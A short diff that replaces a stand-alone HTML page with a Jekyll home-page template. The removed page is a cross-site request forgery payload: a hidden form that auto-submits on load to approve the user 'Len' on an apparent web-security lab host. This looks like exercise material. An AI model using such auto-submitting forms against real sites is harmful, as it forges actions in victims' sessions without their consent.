@@ -1,14 +1,15 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Stand-alone POST to approve Len</title>
-</head>
-<body>
-  <form id="autoForm" action="https://xss01.websec.sec.in.tum.de/approveuser" method="POST">
-    <input type="hidden" name="username" value="Len">
-  </form>
-  <script>
-    document.getElementById('autoForm').submit();
-  </script>
-</body>
-</html>
+---
+layout: home
+title: Home
+permalink: /
+---
+
+<div class="page-container">
+  <link rel="stylesheet" href="{{ '/assets/css/style.css' | relative_url }}">
+
+
+  <div>
+      {% include lookback.html %}
+  </div>
+</div>
+
